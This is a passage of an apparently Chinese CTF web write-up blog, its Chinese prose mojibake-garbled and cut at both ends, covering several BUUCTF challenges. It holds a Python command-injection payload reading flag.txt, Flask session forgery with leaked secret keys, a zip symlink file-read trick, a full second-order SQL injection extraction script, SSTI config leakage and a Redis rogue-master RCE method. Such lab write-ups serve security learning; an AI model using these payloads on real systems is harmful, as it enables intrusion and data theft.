string">'&#123;"history":[&#123;"code":"__import__(\"os\").popen(\"cat flag.txt\").read()"&#125;]&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>ä¼ªé€ sessionï¼Œè®¿é—®ä¸ª404çš„ç½‘ç«™ï¼Œå¯ä»¥æ‹¿åˆ°<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code></p><p>IDå¤„base64è§£ç å‘ç°æ˜¯100ï¼Œä¼ªé€ æˆ1è¯•è¯•</p><pre class="line-numbers language-none"><code class="language-none">python3 *3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &#39;&#123;&quot;id&quot;:&#123;&quot;b&quot;:&quot;1&quot;&#125;,&quot;is_login&quot;:True,&quot;password&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#39; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿›å»äº†ï¼Œæœ‰æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/"</span>        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename        pathname <span class="token operator">=</span> path<span class="token operator">+</span>filename        <span class="token keyword">if</span> <span class="token string">"zip"</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> <span class="token string">"unzip -n -d "</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span> pathname            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>waf<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'not login'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>            <span class="token keyword">return</span> resp        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"can't give you"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤§æ¦‚æµç¨‹å°±æ˜¯ï¼Œä¸Šä¼ ä¸€ä¸ªzipå‹ç¼©çš„å›¾ç‰‡ï¼Œç„¶åè§£å‹å¹¶è¿”å›å†…å®¹å±•ç¤ºï¼Œçœ‹åˆ°ä¸‹é¢flagåœ¨<code>./flag/flag.jpg</code>ä¸­ï¼Œä¼ªé€ è½¯è¿æ¥</p><pre class="line-numbers language-none"><code class="language-none">zipå‘½ä»¤ä¸­-y ç›´æ¥ä¿å­˜ç¬¦å·è¿æ¥ï¼Œè€Œéè¯¥è¿æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶ï¼Œæœ¬å‚æ•°ä»…åœ¨UNIXä¹‹ç±»çš„ç³»ç»Ÿä¸‹æœ‰æ•ˆã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å°†å…¶ä¸Šä¼ å³å¯</p><h2 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h2><p>äºŒæ¬¡æ³¨å…¥å•ŠäºŒæ¬¡æ³¨å…¥</p><p>å·ä¸ªè„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64   <span class="token comment"># ç”¨æ¥è§£16è¿›åˆ¶</span><span class="token keyword">import</span> re       <span class="token comment"># æ­£åˆ™åŒ¹é…</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://a13c51eb-d523-492b-82c0-82566d5c46a1.node4.buuoj.cn:81/"</span>payload<span class="token operator">=</span><span class="token string">"0'+(hex(hex((substr((select * from flag) from &#123;&#125; for 3)))))+'0"</span> <span class="token comment">## å¿…é¡»ä¿è¯æœ‰flagè¡¨ï¼Œä¸”flagè¡¨é‡Œåªæœ‰ä¸€è¡Œä¸€åˆ—ï¼Œå¤šåˆ—éœ€è¦ä½¿ç”¨group_concatæ¥è¿æ¥</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">def</span> <span class="token function">fund</span><span class="token punctuation">(</span>txt<span class="token punctuation">)</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;span class=\"user-name\">\n(.*?)&lt;/span>"</span><span class="token punctuation">,</span> txt<span class="token punctuation">)</span>    t <span class="token operator">=</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">int</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># t=base64.b16decode(t)</span>    <span class="token comment"># t = base64.b16decode(t).decode("ascii")</span>    t<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment">### å¿…é¡»è¦æ±‚tä¸º str</span>    t<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment">### bytes.fromhex è¿”å›ç»“æœæ˜¯bytesç±»å‹çš„</span>    <span class="token comment"># print(t)</span>    <span class="token keyword">global</span> result    result<span class="token operator">+=</span>t<span class="token keyword">for</span>  a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    register<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"1112223@1123111"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span>    <span class="token punctuation">&#125;</span>    login<span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"1112223@1123111"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span>     <span class="token punctuation">&#125;</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    r1<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"register.php"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>register<span class="token punctuation">)</span>    <span class="token keyword">if</span> r1<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">429</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r2<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"login.php"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>login<span class="token punctuation">)</span>        <span class="token keyword">if</span> r2<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">429</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r3<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"index.php"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> r3<span class="token punctuation">.</span>status_code <span class="token operator">==</span><span class="token number">429</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                r3 <span class="token operator">=</span> r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span>                fund<span class="token punctuation">(</span>r3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                fund<span class="token punctuation">(</span>r3<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><p>çœ‹ä»£ç ï¼Œå¯¹ä¸Šä¼ æ–‡ä»¶çš„å¤„ç†</p><pre class="line-numbers language-none"><code class="language-none">if ($cgi-&gt;upload(&#39;file&#39;)) &#123;    my $file &#x3D; $cgi-&gt;param(&#39;file&#39;);    while (&lt;$file&gt;) &#123;        print &quot;$_&quot;;        print &quot;&lt;br &#x2F;&gt;&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>å…¶ä¸­<code>my $file= $cgi-&gt;param( &#39;file&#39; );</code>ä¸­çš„<code>param()</code>å‡½æ•°è¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ã€‚ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥fileå˜é‡ä¸­ã€‚</p><p>while ( &lt;$file&gt; )ä¸­ï¼Œ&lt;&gt;ä¸èƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œé™¤éæ˜¯ARGVï¼Œå› æ­¤å¾ªç¯éå†å¹¶å°†æ¯ä¸ªå€¼ä½¿ç”¨open()<br>è°ƒç”¨ã€‚</p><p>å¯¹äºè¯»æ–‡ä»¶ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚<br>æ‰€ä»¥ï¼Œåœ¨ä¸Šä¼ çš„æ­£å¸¸æ–‡ä»¶å‰åŠ ä¸Šä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡¹ARGVï¼Œç„¶ååœ¨URLä¸­ä¼ å…¥æ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œå°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ã€‚</p></blockquote><p>ARGVå°±æ˜¯å‘½ä»¤è¡Œå‚æ•°</p><h2 id="FBCTF2019-Event"><a href="#FBCTF2019-Event" class="headerlink" title="[FBCTF2019]Event"></a>[FBCTF2019]Event</h2><p>çœ‹å‚æ•°åœ¨event_importantå¤„æœ‰SSTIï¼Œå†çœ‹cookieä¸­æœ‰sessionï¼Œè‚¯å®šæ˜¯ä¼ªé€ æ²¡è·‘äº†ï¼Œå…ˆæå‡ºç§é’¥<code>__class__.__init__.__globals__[app].config</code>ï¼Œ<code> &#39;SECRET_KEY&#39;: &#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#39;</code>ï¼Œç„¶åè„šæœ¬ä¼ªé€ å°±è¡Œäº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterfaceapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">b'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'</span>session_serializer <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session_serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>index<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe"><a href="#ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe"></a>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</h2><p>å…ˆä½¿ç”¨0.0.0.0æ‹¿åˆ°hintï¼Œ<code>redispass is root</code>ï¼Œè¯´æ˜ç›®æ ‡åº”è¯¥æ˜¯å¼€å¯äº†redisæœåŠ¡å¹¶ä¸”å¯†ç æ˜¯rootï¼Œæ­¤å¤„åˆ©ç”¨çš„æ˜¯Redisä¸»ä»å¤åˆ¶æ¥getshell</p><blockquote><h3 id="Redisä¸»ä»å¤åˆ¶"><a href="#Redisä¸»ä»å¤åˆ¶" class="headerlink" title="Redisä¸»ä»å¤åˆ¶"></a>Redisä¸»ä»å¤åˆ¶</h3><p>Redisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬è¿™é¢˜çš„æ€è·¯æ˜¯ï¼Œåˆ›å»ºä¸€ä¸ªæ¶æ„çš„RedisæœåŠ¡å™¨ä½œä¸ºRedisä¸»æœºï¼ˆmasterï¼‰ï¼Œè¯¥Redisä¸»æœºèƒ½å¤Ÿå›åº”å…¶ä»–è¿æ¥ä»–çš„Redisä»æœºçš„å“åº”ã€‚æœ‰äº†æ¶æ„çš„Redisä¸»æœºä¹‹åï¼Œå°±ä¼šè¿œç¨‹è¿æ¥ç›®æ ‡RedisæœåŠ¡å™¨ï¼Œé€šè¿‡ slaveof å‘½ä»¤å°†ç›®æ ‡RedisæœåŠ¡å™¨è®¾ç½®ä¸ºæˆ‘ä»¬æ¶æ„Redisçš„Redisä»æœºï¼ˆslaverï¼‰ã€‚ç„¶åå°†æ¶æ„Redisä¸»æœºä¸Šçš„expåŒæ­¥åˆ°Reidsä»æœºä¸Šï¼Œå¹¶å°†dbfilenameè®¾ç½®ä¸ºexp.soã€‚æœ€åå†æ§åˆ¶Redisä»æœºï¼ˆslaverï¼‰åŠ è½½æ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å³å¯ã€‚<br>é¦–å…ˆéœ€è¦è¿™ä¸¤ä¸ªé¡¹ç›®</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">æ¶æ„so</a></p><p><a href="https://github.com/xmsec/redis-ssrf">ä¼ªé€ ä¸»æœº</a></p><p>å°†æ¶æ„soé¡¹ç›®ä¸­çš„exp.soæ–‡ä»¶æ”¾åˆ°ä¼ªé€ ä¸»æœºé¡¹ç›®çš„ç›®å½•ä¸­ï¼Œä¼ªé€ ä¸»æœºé¡¹ç›®ä¸­æ›´æ”¹ssrfé‚£ä¸ªpythonæ–‡ä»¶æ¥ç”Ÿæˆpayloadï¼Œç„¶åä½¿ç”¨serveræ–‡ä»¶æ¥å¼€å¯ä¼ªè£…æœåŠ¡å™¨ï¼Œä¼ å…¥æ‰§è¡Œå³å¯</p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-notes"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-notes" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes</h2><p>ç»™æºç äº†ï¼Œç›´æ¥çœ‹é‡ç‚¹</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> undefsafe <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'undefsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">edit_note</span><span class="token punctuation">(</span><span class="token parameter">id<span class="token punctuation">,</span> author<span class="token punctuation">,</span> raw</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.author'</span><span class="token punctuation">,</span> author<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">undefsafe</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>note_list<span class="token punctuation">,</span> id <span class="token operator">+</span> <span class="token string">'.raw_note'</span><span class="token punctuation">,</span> raw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/edit_note'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token 